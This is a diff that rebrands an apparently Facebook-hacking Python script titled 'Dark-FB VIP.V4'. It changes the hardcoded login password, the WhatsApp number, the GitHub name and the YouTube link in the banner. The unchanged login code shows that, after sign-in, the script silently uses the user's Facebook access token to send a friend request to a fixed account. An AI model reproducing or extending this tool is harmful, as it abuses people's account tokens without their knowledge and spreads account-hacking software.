@@ -5,7 +5,7 @@ print '\x1b[1;32mSilahkan Login '
 import os, sys
 
 def wa():
-    os.system('xdg-open https://api.whatsapp.com/send?phone=6283847277532&text=Assalamualaikum')
+    os.system('xdg-open https://api.whatsapp.com/send?phone=6283846182982&text=Assalamualaikum')
 
 
 def restart():
@@ -16,7 +16,7 @@ def restart():
 user = raw_input('ID: ')
 import getpass
 sandi = raw_input('Password: ')
-if sandi == 'Special1ksubscribe' and user == 'Mr_Hunters':
+if sandi == 'GunakanDenganBijak' and user == 'Mr.Hack':
     print 'Anda Telah Login'
     sys.exit
 else:
@@ -56,7 +56,7 @@ def jalan(z):
         sys.stdout.flush()
         time.sleep(0.01)
 
-logo = " \x1b[31;1m█████████\n \x1b[31;1m█▄█████▄█         \x1b[0;36m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[31;1m█ \x1b[1;91m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;33m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[31;1m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;33m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;91m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;33m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[37;1mVIP.V4\n \x1b[1;97m█████████         \x1b[0;36m«==========✧==========»\n \x1b[1;97m ██ ██\n \x1b[1;97m╔══════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAdmin  \x1b[1;91m : \x1b[1;96m Hunters Gaming04   \x1b[1;97m                ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m \x1b[92mhttps://github.com/Mr_Hunters\x1b[ \x1b[1;97m      ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mWA      \x1b[1;91m:  \x1b[1;92\x1b[92m083847277532\x1b[     \x1b[1;97m                    ║   \n \x1b[1;97m╚══════════════════════════════════════════════════╝"             '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mSpecial 1k Subscriber Mr_Hunters \x1b[1;91m[\xe2\x98\x86]' '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mTerimakasih Udah Support Channel Ini \x1b[1;91m[\xe2\x98\x86]' '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mSilahkan Log-in Di  Opera Mini No Checkpoint\x1b[1;91m[\xe2\x98\x86]'
+logo = " \x1b[31;1m█████████\n \x1b[31;1m█▄█████▄█         \x1b[0;36m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\n \x1b[31;1m█ \x1b[1;91m▼▼▼▼▼  \x1b[1;97m- _ --_-- \x1b[1;33m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ \n \x1b[31;1m█  \x1b[1;97m  \x1b[1;97m_-_-- -_ --__ \x1b[1;33m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\n \x1b[1;97m█ \x1b[1;91m▲▲▲▲▲ \x1b[1;97m--  - _ -- \x1b[1;33m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝  \x1b[37;1mVIP.V4\n \x1b[1;97m█████████         \x1b[0;36m«==========✧==========»\n \x1b[1;97m ██ ██\n \x1b[1;97m╔══════════════════════════════════════════════════╗\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mAdmin  \x1b[1;91m : \x1b[1;96m Mr.Hack   \x1b[1;97m                ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m \x1b[92mhttps://github.com/Mr.Hack\x1b[ \x1b[1;97m      ║\n \x1b[1;97m║ \x1b[1;93m*  \x1b[1;97mWA      \x1b[1;91m:  \x1b[1;92\x1b[92m083847277532\x1b[     \x1b[1;97m                    ║   \n \x1b[1;97m╚══════════════════════════════════════════════════╝"             '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mSpecial Dari Mr.Hack \x1b[1;91m[\xe2\x98\x86]' '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mBantu Support Channel YT RAZ QUIRO \x1b[1;91m[\xe2\x98\x86]' '\n \x1b[1;91m[\xe2\x98\x86] \x1b[37;1mSilahkan Log-in Di  Opera Mini No Checkpoint\x1b[1;91m[\xe2\x98\x86]'
 
 
 def tik():
@@ -131,7 +131,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin success'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://www.youtube.com/channel/UCz5Z718-ZRUy9aBzCAHqrug')
+                os.system('xdg-open https://www.youtube.com/channel/UCSRggVGYf8PxcupnsEmKIXA')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
